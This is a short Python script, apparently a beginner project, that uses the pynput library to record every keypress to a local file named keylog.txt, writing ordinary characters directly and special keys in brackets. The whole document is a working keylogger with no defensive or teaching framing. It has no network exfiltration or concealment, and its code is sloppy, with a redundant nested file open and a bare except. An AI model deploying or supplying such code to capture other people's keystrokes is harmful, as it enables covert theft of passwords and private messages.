from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt",'a') as logkey:
        try:
            with open("keylog.txt", "a") as f:
                if hasattr(key, 'char'):  # Alphanumeric keys
                    f.write(key.char)
                else:  # Special keys
                    f.write(f" [{key}] ")
        except:
            print("error getting char")
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=keyPressed)
    listner.start()
    input()